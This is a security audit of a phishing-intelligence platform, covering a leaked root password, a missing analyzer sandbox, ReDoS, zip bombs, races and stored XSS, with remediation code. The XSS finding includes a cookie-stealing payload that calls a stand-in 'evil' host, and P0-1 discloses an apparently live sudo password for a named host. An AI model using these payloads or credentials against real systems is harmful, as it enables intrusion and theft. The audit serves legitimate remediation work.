# Outpost — Security & Engineering Audit

**Date:** 4 August 2026
**Scope:** `src/pkintel` (~12k LOC), `db/migrations`, `deploy/`, `.github/workflows`, `frontend/`, `research_portal/`
**Target host:** i7-8700K (6C/12T) · 32 GB · SATA SSD · Arch · `outpost.heapleap.tech`
**Method:** full source read + targeted execution of suspect code paths. Every finding below was verified, not inferred.

---

## Executive summary

The architecture is genuinely good: Postgres-as-queue with `FOR UPDATE SKIP LOCKED`, a reaper for stuck rows, honest per-host throttling, fail-closed indicator encryption, real safe-extract guards. The docstrings are some of the best I've read in a project this size.

But there is a serious gap between what the code **says** it does and what it **actually** does, and that gap sits exactly on the security boundary. Three findings are critical enough to warrant action today.

| Sev | Count | Theme |
|---|---|---|
| **P0** | 5 | Credential exposure, missing sandbox, remote hang, unsandboxed browser |
| **P1** | 14 | Data-loss races, deploy breakage, scaling walls, XSS |
| **P2** | 12 | Currency, dead code, tuning |

---

# P0 — Fix today

## P0-1 · Root password for the production box is in a public GitHub repo

`.github/workflows/deploy.yml:26`

```yaml
echo root123 | sudo -S bash -c "
  cd /opt/heapleap && git pull origin main || true
  chown -R outpost:outpost /opt/heapleap
  systemctl restart outpost-api outpost@ingest ...
"
```

`git remote -v` → `https://github.com/faseehfawaz/outpost.git`. Commit `f912913` introduced it and it is still on `main`. `root123` is the sudo password for user `fazee` on the box that runs `outpost.heapleap.tech`. Anyone who has cloned the repo — or any of the several bots that continuously scrape GitHub for credentials — has full root on that machine.

It is also echoed into GitHub Actions logs on every run.

**Do now, in this order:**

1. Change the `fazee` password on the box. Assume it is compromised.
2. Rotate everything that machine has touched: `PKINTEL_SMTP_PASS`, `PKINTEL_INDICATOR_ENC_KEY`, R2 keys, Sentry DSN, GSB key, the `outpost` Postgres password, and any SSH keys in `~/.ssh` on the host.
3. Purge from history (`git filter-repo --path .github/workflows/deploy.yml --invert-paths`, force-push) — but treat this as damage limitation, not remediation. The credential is already public.
4. Replace the pattern entirely. Give the deploy user a scoped NOPASSWD sudoers rule instead of a password:

```
# /etc/sudoers.d/outpost-deploy
fazee ALL=(root) NOPASSWD: /usr/bin/systemctl restart outpost-api.service, \
                           /usr/bin/systemctl restart outpost@ingest.service, \
                           /usr/bin/systemctl restart outpost@triage.service, \
                           /usr/bin/systemctl restart outpost@kithunt.service, \
                           /usr/bin/systemctl restart outpost@takedown.service
```

Then run `git pull` as the `outpost` user directly (it owns `/opt/heapleap`), and drop the `chown -R` entirely.

**Also:** enable GitHub secret scanning + push protection on the repo so this class of mistake is caught at push time.

---

## P0-2 · The analyzer sandbox does not exist

The README, the pipeline diagram, `docs/SCOPE_AND_ETHICS.md`, `config.py`, `docker-compose.yml` and `storage.py` all describe attacker archives being analysed inside a hardened container:

> `--network none` · non-root user · read-only fs · 30-second timeout
> *"The analyzer pulls bytes from here into a no-network container."*

`src/pkintel/analyzer/runner.py` does none of it. It downloads the archive, writes it to a host `tempfile.TemporaryDirectory()`, extracts it on the host, reads every `.php` on the host, and runs the deobfuscator on the host — in the same process, as the `outpost` user, with the DB credentials in memory and network access to everything.

Corroborating evidence:

- `grep -rn "docker\|subprocess" src/` returns exactly one hit: the unused `analyzer_image` config field. Nothing ever launches a container.
- `analyzer_container/Dockerfile` sets `ENTRYPOINT ["python", "-m", "pkintel.analyzer.container_main"]`. **`container_main.py` does not exist.** The image cannot start.
- The only container-shaped entrypoint, `analyzer_container/run_analysis.py`, is never `COPY`'d into the image and is never invoked by anything.
- `analyzer_timeout_s`, `analyzer_mem_limit`, `analyzer_cpu_limit` are dead config — nothing reads them, so there is no timeout, no memory cap and no CPU cap on kit analysis.
- `docker-compose.yml` mounts `/var/run/docker.sock` into the worker "because the analyzer worker needs it". It doesn't — and Docker socket access is root-equivalent on the host. `setup-elitedesk.sh` likewise runs `usermod -aG docker outpost` for the same non-existent reason.

**Two viable fixes.** Pick one and update the docs to match.

**(a) Actually build the sandbox** — matches the stated design:

```python
# analyzer/runner.py — replace the in-process block
proc = subprocess.run([
    "docker", "run", "--rm",
    "--network", "none",
    "--read-only",
    "--tmpfs", "/tmp:size=600m,noexec,nosuid",
    "--memory", settings.analyzer_mem_limit,
    "--cpus", settings.analyzer_cpu_limit,
    "--pids-limit", "128",
    "--cap-drop", "ALL",
    "--security-opt", "no-new-privileges",
    "-v", f"{archive_path}:/in/archive.zip:ro",
    settings.analyzer_image, "/in/archive.zip",
], capture_output=True, timeout=settings.analyzer_timeout_s)
result = AnalysisResult.model_validate_json(proc.stdout)
```

Write the missing `pkintel/analyzer/container_main.py` (basically `run_analysis.py`, emitting `AnalysisResult` JSON on stdout), fix the Dockerfile to copy it, and — importantly — build the image without `psycopg`/DB creds so the sandbox has nothing to steal. Prefer **rootless Podman** over Docker here so the worker never needs socket access at all.

**(b) Be honest** — if you don't want the container, remove the claims from README/docs/config and delete `analyzer_container/`. But then P0-3 and P0-5 become mandatory, not optional, because they are the guardrails the container was supposed to provide.

Either way: **remove the docker socket mount and the `docker` group membership now.** They currently grant root-equivalence for zero functionality.

---

## P0-3 · Catastrophic ReDoS in the deobfuscator — a remote, unauthenticated pipeline kill

`src/pkintel/analyzer/deobfuscate.py:118`

```python
(?P<body>(?:\\.|(?!(?P=q)).)*)
```

Both alternation branches match a backslash (`\\.` consumes two chars, `(?!quote).` consumes one), so on a literal that never closes its quote the engine explores an exponential number of split points.

**Measured**, isolated regex, single `eval(` prefix, unterminated `'`:

| backslashes | time |
|---|---|
| 24 | 0.079 s |
| 26 | 0.206 s |
| 28 | 0.544 s |
| 30 | 1.41 s |
| 32 | 3.71 s |

Growth is **×2.6 per 2 backslashes**. Extrapolating: 40 → ~3 min, 50 → ~6 h, 60 → months. End-to-end through `deobfuscate()` with a realistic `eval(gzinflate(base64_decode('` prefix, **16 backslashes already exceeded 44 s** — nesting multiplies the blowup.

The full kill chain:

1. Attacker leaves a `kit.zip` in an open directory containing `evil.php` with `<?php eval(gzinflate(base64_decode('\\\\\\\\\\\\...` (~60 bytes).
2. Kithunter collects it (that's the whole point of the system).
3. Analyzer worker calls `deobfuscate()` — **on the host, with no container, no timeout, no CPU limit** (P0-2).
4. Worker hangs forever. The reaper's 20-minute lease expires and returns the kit to `stored`.
5. Next worker picks it up and hangs. Repeat until all 6 `analyzer_workers` are wedged.
6. `reaper_max_reaps=3` eventually parks it in `error` — but by then you've burned three worker-lifetimes per attempt, and nothing stops the attacker planting a hundred of them.

The kit-analysis stage — the differentiating feature of the whole platform — is remotely disableable by anyone who reads this repo.

**Fix — make the alternation unambiguous:**

```python
(?P<body>(?:\\.|[^\\](?<!(?P=q)))*)   # branches are now disjoint
```

Simpler and more robust — bound the literal, since real payloads are never megabytes of escapes:

```python
_CHAIN_RE = re.compile(
    r"""
    (?P<funcs>(?:@?[ \t]*[A-Za-z_]\w*[ \t]*\([ \t]*){1,8})
    (?P<q>['"])
    (?P<body>(?:\\.|[^'"\\]){0,2000000})
    (?P=q)
    [ \t]*\)+
    """,
    re.VERBOSE,
)
```

**Belt and braces — add all three:**

- Skip files over ~5 MB before deobfuscating.
- Wrap the per-file deobfuscation in a hard wall-clock budget (`signal.alarm` in the sandbox process, or a `ThreadPoolExecutor` future with `timeout=`).
- Consider `pip install regex` and use `regex.match(..., timeout=5.0)` — the stdlib `re` has no timeout parameter.

Add a regression test with a 40-backslash payload and `pytest.mark.timeout(5)`.

---

## P0-4 · Chromium renders attacker pages with `--no-sandbox`

`src/pkintel/triage/render.py:145`

```python
"args": ["--no-sandbox", "--disable-dev-shm-usage", ...]
```

`render_enabled=True` by default, and `render_min_score=10` means most interesting candidates get rendered. So the platform deliberately navigates to live attacker-controlled infrastructure, executes their JavaScript, and does it **with Chromium's renderer sandbox disabled**, as the `outpost` user on the host.

`--no-sandbox` removes the seccomp-bpf/namespace layer that turns a V8 or Blink memory-safety bug into a contained renderer crash. Without it, a single renderer RCE is direct code execution as `outpost` — which owns `/opt/heapleap`, holds the DB credentials, the SMTP password and the indicator encryption key. Browser 0-days against exactly this surface are a live commercial market.

Note the irony: `--no-sandbox` is normally added to make Chromium run *inside* a container. Here there is no container (P0-2), so it's pure downside.

**Fix:** remove `--no-sandbox`. If Chromium then fails to launch on Arch, the actual cause is unprivileged user namespaces, and the correct fix is:

```bash
sysctl -w kernel.unprivileged_userns_clone=1
# persist: /etc/sysctl.d/99-userns.conf
```

Keep `--disable-dev-shm-usage`. Then harden the render stage further in `outpost@.service`:

```ini
SystemCallFilter=@system-service
SystemCallArchitectures=native
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
PrivateDevices=true
ProtectClock=true
ProtectHostname=true
```

Ideally run `outpost@triage` in its own container/VM. It is the only stage that executes attacker code, and it should be the most isolated thing on the box — right now it is the least.

**Related bug, same function:**

```python
"env": {"CHROME_CRASHPAD_PIPE_NAME": ""},
```

Playwright's `env` **replaces** the process environment rather than extending it. Chromium launches with no `PATH`, no `HOME`, no `XDG_*`. Use `{**os.environ, "CHROME_CRASHPAD_PIPE_NAME": ""}`.

---

## P0-5 · Unbounded in-memory decompression (zip bomb via the decoder chain)

`safe_extract.py` is careful — it caps file count, caps total uncompressed bytes, and re-counts real bytes during extraction. Good work. But the deobfuscator then bypasses all of it:

```python
@_dec("gzinflate")
def _gzinflate(data: bytes) -> bytes:
    return zlib.decompress(data, -zlib.MAX_WBITS)   # no max_length
```

A 40 KB base64 blob of highly compressible data inflates to gigabytes in RAM, in-process, on the host, with `analyzer_mem_limit` unread (P0-2). `deobfuscate()` then loops up to `max_rounds=25`, so each round can re-inflate. `outpost-pipeline.service` sets no `MemoryMax` at all → OOM killer takes whatever it likes on a 32 GB box.

**Fix:**

```python
_MAX_DECODED = 32 * 1024 * 1024

@_dec("gzinflate")
def _gzinflate(data: bytes) -> bytes:
    d = zlib.decompressobj(-zlib.MAX_WBITS)
    out = d.decompress(data, _MAX_DECODED)
    if d.unconsumed_tail:
        raise ValueError("decompression cap exceeded")
    return out
```

Same for `_gzuncompress` and `_gzdecode`. Cap `_base64_decode` input length too. `_apply_chain` already treats a raised exception as "give up on this chain", so this degrades correctly.

Add `MemoryMax=4G` to `outpost-pipeline.service` regardless.

---

# P1 — Fix this week

## P1-6 · Kithunter races triage and permanently drops fresh phish

`db/migrations/001_init.sql:54` — `kithunt_state TEXT NOT NULL DEFAULT 'pending'`

Ingest (`ingest/runner.py:49`), certstream (`certstream.py:52`) and enrich SAN-discovery (`enrich/runner.py:90`) all `INSERT INTO urls` **without** setting `kithunt_state`, so every brand-new URL lands in `'pending'` — which is precisely the value `kithunter/runner.py:86` claims on.

So the kithunter competes for untriaged rows. `_hunt_one` sees `triage_state != 'triaged'` and writes `kithunt_state = 'skipped'`. Meanwhile triage finishes and writes `kithunt_state = 'pending'`. **Whichever lands last wins.** When the kithunter's write lands second, a confirmed phish is silently and permanently excluded from kit collection — the one stage that produces the platform's unique data.

The `outpost@kithunt` unit polls every 30 s against an ingest stage inserting thousands of rows per cycle, so this fires constantly.

**Fix:**

```sql
ALTER TABLE urls ALTER COLUMN kithunt_state SET DEFAULT 'waiting';
UPDATE urls SET kithunt_state = 'waiting'
 WHERE triage_state = 'new' AND kithunt_state = 'pending';
```

Triage already sets `'pending'`/`'skipped'` explicitly at the end, so nothing else changes. Also add the guard to the claim itself so it can't recur:

```python
claim_rows("urls", ready_col="kithunt_state", ready_value="pending", ...,
           extra_where="is_phish = true AND triage_state = 'triaged'")
```

**While you're in there:** none of the kithunt terminal updates clear `locked_by`/`locked_at` (triage does). Harmless today because the reaper filters on state, but it leaves misleading lock data and will bite whoever debugs this next.

## P1-7 · Every `outpost@*.service` unit is misconfigured (two ways)

**(a) `ReadWritePaths` references a directory that doesn't exist.**

`outpost@.service:64` — `ReadWritePaths=/opt/heapleap/.storage /opt/heapleap/logs /dev/shm`

`setup-elitedesk.sh` only creates `/opt/heapleap/.storage/kits`. With `ProtectSystem=strict`, a non-existent `ReadWritePaths` entry makes systemd fail the mount namespace setup and the unit refuses to start. Prefix with `-` to make it optional, or create the directory:

```ini
ReadWritePaths=/opt/heapleap/.storage -/opt/heapleap/logs /dev/shm
```

Also add `-/opt/heapleap/.cache` — Playwright writes its browser cache there and `ProtectSystem=strict` makes `/opt/heapleap` read-only otherwise.

**(b) Rate-limit directives are in the wrong section.**

`StartLimitIntervalSec` and `StartLimitBurst` moved to `[Unit]` in systemd v229. They are in `[Service]` in both `outpost@.service` and `outpost-certstream.service`, so systemd logs "Unknown key name" and **the crash-loop protection is silently absent** — the exact scenario the comment says it's guarding against. Move both to `[Unit]`.

Verify with `systemd-analyze verify /etc/systemd/system/outpost@.service`.

## P1-8 · Three overlapping service topologies run the same stages concurrently

- `outpost-pipeline.service` → `pkintel run all --loop` (every stage, sequentially, one process)
- `outpost-ct.service` → `pkintel run ingest --loop --interval 15` (despite the name)
- `outpost.target` → 10 separate `outpost@<stage>` units
- `start.sh` (Docker path) → also runs `pkintel run all --loop` alongside uvicorn

`setup-elitedesk.sh` step 5 tells the operator to enable `outpost-pipeline outpost-api outpost-ct`, while `outpost@.service`'s own header says it *replaces* `outpost-pipeline`. Enabling both means ingest runs three times over, and every stage runs twice — doubling outbound requests to victim servers, which matters given the ethics posture.

**Fix:** delete `outpost-pipeline.service` and `outpost-ct.service`, rewrite the setup script's step 5 to `systemctl enable --now outpost.target`, and add `Conflicts=outpost.target` to any legacy unit you keep.

## P1-9 · Connection-pool exhaustion at the Postgres level

`db_pool_max = 20` per **process**. `outpost.target` starts 10 stage units + `outpost-api` + `outpost-certstream` = 12 processes × 20 = **240 potential connections**, against `max_connections = 100` in `postgresql.tuned.conf`.

Under load, callers hit `db_pool_timeout_s` (10 s) and stages start failing in ways that look like network problems. Two options:

- Set `PKINTEL_DB_POOL_MAX=6` in `/opt/heapleap/.env` (12 × 6 = 72, comfortably under 100), with per-stage overrides in `.env.triage` for the hot stages; **or**
- Put **PgBouncer** in transaction mode in front (recommended). It also fixes the `work_mem = 64 MB` × N-backends arithmetic, which currently assumes ~30 connections.

## P1-10 · Every worker metric is discarded

`register_collectors()` and `make_asgi_app()` are called only in `api/app.py`. The worker processes increment `stage_duration`, `urls_processed`, `deep_rescued`, `rows_reaped`, `takedown_time_to_death`, `certstream_certs` … into a registry that is **never scraped and dies with the process**. `ops/prometheus.yml` only targets `api:8000`.

So the API's `/metrics` shows queue depths and Python process stats, and nothing else. All the careful instrumentation is write-only.

**Fix:** add a metrics listener to each worker.

```python
# cli/main.py, in _run()
import os
from prometheus_client import start_http_server
port = int(os.environ.get("OUTPOST_METRICS_PORT", "0"))
if port:
    start_http_server(port)
```

Set `Environment=OUTPOST_METRICS_PORT=910%i`-style per-stage ports in `outpost@.service`, or — simpler for short-lived batch stages — use `prometheus_client.multiprocess` with a shared `PROMETHEUS_MULTIPROC_DIR` on tmpfs and let the API expose the union.

## P1-11 · The typecheck CI job is a no-op

`pyproject.toml:115` — `ignore_errors = true` under `[tool.mypy]`. `mypy src/` reports nothing, always passes, and has never caught anything. Given the codebase is fully type-annotated, this is throwing away real value.

Turn it off and fix incrementally:

```toml
[tool.mypy]
python_version = "3.12"
plugins = ["pydantic.mypy"]
ignore_missing_imports = true
warn_unused_ignores = true
# ignore_errors removed

[[tool.mypy.overrides]]
module = ["pkintel.fingerprint.*", "pkintel.takedown.*"]  # burn down over time
ignore_errors = true
```

## P1-12 · `uv.lock` is stale and does not match `pyproject.toml`

`cryptography`, `dnspython` and `playwright` are declared in `pyproject.toml` but **absent from `uv.lock`**. A `uv sync` produces an environment where `pkintel.crypto` silently returns `None` for every indicator (fail-closed → all abuse-desk evidence lost) and `enrich` cannot resolve DNS.

CI happens to work because it uses `pip install '.[dev]'`, which ignores the lock. That means the lock file is untested and misleading.

Run `uv lock` and commit. Add `uv lock --check` to CI so it can't drift again.

## P1-13 · Missing index on `takedowns.url_id`

`takedown/runner.py` Phase 2 runs this every cycle:

```sql
SELECT u.id, u.url, u.host FROM urls u
LEFT JOIN takedowns t ON u.id = t.url_id
WHERE u.is_phish = true AND t.id IS NULL LIMIT 10
```

There is no plain index on `takedowns.url_id`. `uq_takedowns_url_target` is partial (`WHERE target_type IN ('host','registrar')`) and cannot serve the anti-join. So every cycle does a full scan of `takedowns` to return 10 rows, and it degrades linearly forever.

```sql
CREATE INDEX CONCURRENTLY idx_takedowns_url_id ON takedowns (url_id);
```

Add `ORDER BY u.priority DESC, u.id` too — currently the highest-value phish can queue behind stale rows at takedown time, undoing the priority work done at ingest.

## P1-14 · Three N+1 query patterns

Each `execute()` call in this codebase opens its own pooled connection **and** its own transaction. These loops are therefore far more expensive than they look:

| Location | Pattern | Cost |
|---|---|---|
| `ingest/runner.py:145` | `cur.execute(_INSERT_SQL, ...)` per URL | 15 adapters × up to 2000 = **~30,000 round trips/cycle**, in one long-held transaction |
| `analyzer/runner.py:97` | `execute(...)` per kit file | one connection + transaction **per file**; a 500-file kit = 500 transactions |
| `enrich/runner.py:159` | `_favicon_for()` per host | 200 hosts = 200 separate connections |

Fixes: use `execute_many` (already written and used elsewhere) for the analyzer and enrich cases; for ingest use `COPY` into a temp table plus a single `INSERT … SELECT … ON CONFLICT`, or at minimum `cur.executemany` with `returning=True`. For enrich, replace `_favicon_for` with one `DISTINCT ON (host)` query fetched before the loop.

## P1-15 · `_SEED_SQL` full-scans the phish set every 30 seconds

`enrich/runner.py:44`

```sql
INSERT INTO hosts (hostname)
SELECT DISTINCT u.host FROM urls u WHERE u.is_phish = true AND u.host <> ''
ON CONFLICT (hostname) DO NOTHING
```

Runs on every cycle. As `urls` grows this becomes a growing `DISTINCT` + sort + conflict-check that produces zero new rows 99.9% of the time. Make it incremental:

```sql
INSERT INTO hosts (hostname)
SELECT DISTINCT u.host FROM urls u
WHERE u.is_phish = true AND u.host <> ''
  AND u.triaged_at > now() - interval '1 hour'
ON CONFLICT (hostname) DO NOTHING
```

…or drive it from the triage write path directly.

## P1-16 · Stored XSS in the research portal

`research_portal/js/research.js:89, 129, 165`

```js
container.innerHTML = items.map(item => `
  <span class="defanged-url">${defangUrl(item.url)}</span>
  <span class="badge badge-brand">${item.brand || 'Unclassified'}</span>
```

`defangUrl` only rewrites `http` → `hXXp` and `.` → `[.]`. It does **not** escape HTML. `item.url` is attacker-controlled by construction — this system ingests URLs from public phishing feeds. Registering `https://x.com/<img src=x onerror=fetch('//evil/'+document.cookie)>` gets it stored and rendered as live HTML in the analyst's browser.

`frontend/js/` does this correctly (`U.escapeHtml` everywhere) — the research portal is the new, untracked code that missed it. Port `escapeHtml` over and apply it to every interpolation. Add a CSP header on the API's static mount as defence in depth:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```

## P1-17 · Secrets are world-readable on the host

`setup-elitedesk.sh` runs `chmod -R 755 /opt/heapleap`, and the printed instructions say `cp deploy/.env.example /opt/heapleap/.env` with no `chmod`. That `.env` holds `PKINTEL_SMTP_PASS`, `PKINTEL_INDICATOR_ENC_KEY`, the R2 secret and the GSB key — readable by every local user and every process on the box.

Also: `CREATE USER outpost WITH PASSWORD 'outpost'`.

```bash
chmod 600 /opt/heapleap/.env
chown outpost:outpost /opt/heapleap/.env
chmod 750 /opt/heapleap
chmod 700 /opt/heapleap/.storage
```

Generate the Postgres password (`openssl rand -base64 24`) and write it into `.env` from the script. Longer term, move `INDICATOR_ENC_KEY` and `SMTP_PASS` into `systemd-creds` (`LoadCredentialEncrypted=`) so they never sit in a plaintext file at all.

## P1-18 · Takedown channels report success when they've done nothing

`takedown/channels.py` posts unauthenticated to endpoints that all require authentication or a captcha:

| Channel | Reality |
|---|---|
| `safebrowsing.google.com/safebrowsing/report_phish/` | reCAPTCHA-gated web form. Returns **200 with the form page**, so `status_code in (200, 302)` reports success on every failure. The proper path is the **Web Risk Submission API** (`webrisk.googleapis.com/v1/projects/*/uris:submit`) with `PKINTEL_GSB_API_KEY` — which is configured but never used. |
| `phishtank.com/add_web_phish.php` | Requires an authenticated session; PhishTank registration has been closed to new users, so obtaining one isn't possible today. |
| `report.netcraft.com/api/v3/report/urls` | Requires an `email` field and/or auth header. Bare `{"urls":[...]}` is rejected. |

`dispatch_all_channels` also emails aeCERT and APWG **once per URL**, with no batching, dedupe or rate limit. A busy day could send hundreds of individual notices to `incidents@aecert.ae` — that is the fastest way to get blocklisted by the exact CERT you want to build credibility with.

**Fix:** implement Web Risk properly, drop or gate PhishTank and Netcraft behind real credentials, and batch aeCERT/APWG into one digest per run (or per day) listing all URLs. Verify each channel with a `curl` before trusting the "5 channels dispatched" log line — right now that number is not measuring what it claims.

## P1-19 · Takedown emails will fail DMARC and score as spam

`takedown/mailer.py` builds an `EmailMessage` with `Subject`, `From`, `To`, `Bcc` and a text body. Missing: `Date`, `Message-ID`, `Reply-To`. `smtplib.send_message` does not add them. Most abuse desks run spam filtering; a message with no `Date` and no `Message-ID` is heavily penalised or dropped outright — silently.

Worse, `msg["From"] = settings.takedown_from_email` (`security@heapleap.tech`) while the SMTP session authenticates as whatever `smtp_user` is. If those don't align, and if `heapleap.tech` has SPF/DKIM/DMARC (it should), the mail fails alignment and gets quarantined.

```python
from email.utils import formatdate, make_msgid
msg["Date"] = formatdate(localtime=True)
msg["Message-ID"] = make_msgid(domain="heapleap.tech")
msg["Reply-To"] = settings.takedown_from_email
```

Then verify SPF/DKIM/DMARC alignment for `heapleap.tech` end-to-end. Given the platform's headline metric is "notices filed", it's worth proving they are actually *delivered* — pair this with the (excellent) `verify.py` outcome tracking.

## P1-20 · Clustering rescans the entire corpus every cycle

`fingerprint/cluster.py:84` — `SELECT kit_id, type, value_hash FROM indicators` with no `WHERE`, plus a full fingerprint load, on every run. Then `itertools.combinations` over each bucket: a single popular indicator shared by 500 kits produces 124,750 candidate pairs.

At current scale (a handful of kits) this is free. It becomes the wall the moment kit collection starts working. Add an incremental path — only re-cluster components touched by kits analysed since the last run — and cap bucket size (skip buckets above e.g. 200 members, the same shared-hosting logic `pivot.py` already applies correctly).

---

# P2 — Currency and cleanup

## P2-21 · `certstream.calidog.io` has been unreliable for years

`certstream_url` defaults to `wss://certstream.calidog.io/`. The public CaliDog aggregator has had extended outages going back to at least December 2023, and the project's official channels have been quiet since 2022. Your `run_forever()` backoff handles disconnects gracefully — which means a permanently dead endpoint looks exactly like "no lookalike domains today". Silent zero on your highest-value feed.

**Self-host instead.** `certstream-server-go` is a drop-in replacement and runs comfortably in a container on this box:

```yaml
certstream:
  image: 0rickyy0/certstream-server-go:latest
  ports: ["8080:8080"]
  restart: unless-stopped
```
```bash
PKINTEL_CERTSTREAM_URL=ws://localhost:8080/full-stream
```

LeakIX's `go-certstream` is the other good option (lower memory).

Also add a liveness guard: if `stats["certs"] == 0` for two consecutive report windows, log an **error** and increment a Prometheus counter. A silently-empty firehose should page you, not look healthy.

## P2-22 · Telegram token regex misses modern tokens

`analyzer/indicators.py:10`

```python
TELEGRAM_BOT_TOKEN_RE = re.compile(r"(\d{8,10}:[A-Za-z0-9_-]{35})")
```

Bot IDs crossed 10 digits long ago and 11-digit IDs are now routine; the secret is conventionally 35 chars but is not guaranteed to be. This regex silently misses newer bots — the ones most likely to be in a kit collected today.

```python
TELEGRAM_BOT_TOKEN_RE = re.compile(r"\b(\d{8,12}:[A-Za-z0-9_-]{30,50})\b")
```

## P2-23 · Exfil channel coverage is a few years behind kit reality

Currently detected: Telegram token, Telegram chat id, Discord webhook, email, generic URL. Missing channels that are common in 2025–2026 kits:

- **Slack** incoming webhooks — `hooks.slack.com/services/T…/B…/…`
- **Microsoft Teams** webhooks — `*.webhook.office.com/webhookb2/…`
- **Transactional email APIs** — Resend (`re_…`), SendGrid (`SG.…`), Mailgun, Brevo, Postmark. These are now the default exfil route for kits that want deliverability.
- **Firebase / Firestore** — `*.firebaseio.com`, `firestore.googleapis.com/v1/projects/…`
- **Cloudflare Workers / Pages Functions** — `*.workers.dev`
- **Telegram Web App / MTProto** — `t.me/…`, `api.telegram.org/bot…/sendMessage` assembled at runtime
- **Supabase** — `*.supabase.co/rest/v1/…` with an `anon` key
- **ntfy / Pushover / Gotify** — increasingly common for low-effort kits

Each is a one-line regex plus an `IndicatorType` enum member, a `redact()` entry and a migration to widen the `indicators.type` comment. High value per unit of effort — these are the links that make the actor graph work.

Also note `_add_indicator` does a linear `any(...)` scan of the accumulated list for every match — O(n²) on a file with many URLs. Use a `set` of `(type, hash)`.

## P2-24 · Dead schema: pgvector and `llm_verdict`

- Migration `005` creates `kits.embedding vector(384)`, `urls.embedding vector(384)` and two HNSW indexes. **No code anywhere writes an embedding.** The extension, columns and indexes are pure overhead. Either wire it up (a `bge-small-en-v1.5` / `all-MiniLM-L6-v2` embedding of the rendered DOM would pair beautifully with the existing pHash + TLSH signals for near-duplicate kit detection) or drop the migration.
- `urls.llm_verdict JSONB` (migration 003) is likewise never written, even though `triage/runner.py` computes exactly that verdict and only puts it in a log line. One-line fix — persist it; it's the audit trail for every LLM-rescued phish.
- Migration `005` has no `BEGIN`/`COMMIT`, unlike 001–004. Inconsistent and non-atomic.

## P2-25 · IOC endpoint returns duplicate rows

`api/routes/ioc.py` — `LEFT JOIN kit_actor ka` fans out: a kit belonging to two actor clusters yields two rows for each of its indicators, and the `LIMIT` then silently truncates real data. Use `DISTINCT ON (i.id)` or aggregate actors into an array. `ORDER BY i.id DESC` also means "newest indicator", not "newest sighting" — probably not what `first_seen` implies to a consumer.

## P2-26 · Python version declared four different ways

`README` badge says 3.12 · `requires-python = ">=3.11"` · `ruff target-version = "py311"` · `mypy python_version = "3.12"` · CI runs 3.12 · both Dockerfiles are `python:3.12-slim`.

Pick 3.12 (or 3.13 — it's stable, faster, and everything here supports it) and make all five agree. The `UP017` ruff ignore justifies itself with "only exists on Python 3.11+", which is true of your minimum anyway.

## P2-27 · Chromium instances are never recycled

`_ensure_thread_browser()` creates a thread-local `Browser` and nothing ever closes it. `BrowserPool.close()` calls `executor.shutdown(wait=False)`, which does not terminate the Chromium processes. In `--loop` mode these live for the process lifetime. Chromium leaks steadily when fed hostile pages.

Add a render counter per thread and tear down + recreate the browser every N renders (500 is a reasonable start). Track `browser_pool_in_use` — the gauge already exists in `metrics.py` but is never set.

## P2-28 · Docker image is ~400 MB heavier than it needs to be

`Dockerfile` declares `FROM python:3.12-slim AS base` but never uses a second stage, so `build-essential` (needed only to compile `python-tlsh`) and `docker.io` (needed only for the sandbox that doesn't exist) ship in the final image. That's build tooling and a container runtime inside your production image.

```dockerfile
FROM python:3.12-slim AS builder
RUN apt-get update && apt-get install -y --no-install-recommends build-essential
COPY pyproject.toml README.md ./
COPY src ./src
RUN pip wheel --wheel-dir /wheels .

FROM python:3.12-slim
COPY --from=builder /wheels /wheels
RUN pip install --no-index --find-links=/wheels pkintel && rm -rf /wheels
```

Drop `docker.io` entirely (use rootless Podman on the host if you implement P0-2a).

## P2-29 · Renderer false positives on exfil detection

`render.py:_on_request` flags **any** off-origin POST as exfil. Google Analytics, Sentry, Facebook Pixel, Hotjar and consent platforms all POST off-origin on ordinary pages — including on compromised legitimate sites, which is most of your corpus. Allowlist the top ~50 analytics/CDN/telemetry hosts before flagging, or weight the signal by whether the page also has a password field.

## P2-30 · `MemoryMax=8G` × 10 units on a 32 GB box

`outpost@.service` sets `MemoryMax=8G` / `MemoryHigh=6G` per stage. With 10 stage units that's an 80 GB ceiling on 32 GB of RAM. Combined with `shared_buffers = 8GB`, 6 Chromium instances (~2–4 GB), the `/dev/shm` render tmpfs, and an 8B-parameter Ollama model (~6 GB) if `llm_enabled` is ever turned on, the box is meaningfully oversubscribed.

Suggested per-stage budget for this hardware:

| Stage | MemoryMax | Notes |
|---|---|---|
| triage | 8G | Chromium pool lives here |
| analyze | 4G | after P0-5 caps decompression |
| ingest | 2G | |
| enrich, pivot, cluster, kithunt, takedown, verify, reaper | 1G each | |

Total ≈ 21 GB, leaving room for Postgres and the page cache. Also pin `/dev/shm` explicitly (`Options=size=4G` in `/etc/fstab`) — the 50%-of-RAM default lets Chromium's cache claim 16 GB.

## P2-31 · Storage `_resolve_local_file` glob is fragile

`storage.py:_resolve_local_file` falls back to `base_dir.rglob(f"*{filename}*")` when a key isn't found, then copies whatever it finds into the canonical path. The filename is a sha256, so a collision is implausible — but this is an unbounded recursive glob over the quarantine directory on every cache miss, and it silently rewrites storage layout as a side effect of a read. Make it an explicit one-time `pkintel storage migrate` command instead of an implicit fallback in the hot path.

## P2-32 · Smaller items worth a pass

- `takedown/runner.py:181` — `host_info.get("abuse_email", "abuse@localhost")` returns `None`, not the default, when the key exists with a `None` value. Use `host_info.get("abuse_email") or "abuse@localhost"`. Same for `registrar_abuse_email`.
- `db.py:reap_stuck_rows` — `urls` has one `reap_count` shared between the `triage_state` and `kithunt_state` machines, so reaps from different stages accumulate on the same counter and can poison a row prematurely. Split into `reap_count_triage` / `reap_count_kithunt`.
- `start.sh` — no `exec`, no `wait`, no signal forwarding. If the worker dies the container stays "healthy". Use a proper supervisor or split into two containers.
- `pyproject.toml` ruff ignores `F841` (unused local) and `S110`/`S112` (silent `except: pass`). The first hides real bugs; the latter two are load-bearing here but deserve per-line `# noqa` rather than a blanket ignore.
- `scratch/test_send_email.py` is gitignored but present on disk — check it doesn't hold a real SMTP password.
- `deploy/outpost_dump.sql` (6.9 MB, 14,874 rows including 21 `victim_log_sightings`) is correctly gitignored and untracked. Confirm it's also not in any earlier commit, and that it's `chmod 600` on the box.
- Consider **PostgreSQL 18** when convenient — async I/O and improved planner behaviour are a good fit for this SATA-bound, index-heavy workload. Re-tune `effective_io_concurrency` if you migrate.

---

# Suggested order of work

**Today**
1. Change the box password, rotate every secret (P0-1)
2. Purge `deploy.yml`, replace with scoped sudoers; enable push protection (P0-1)
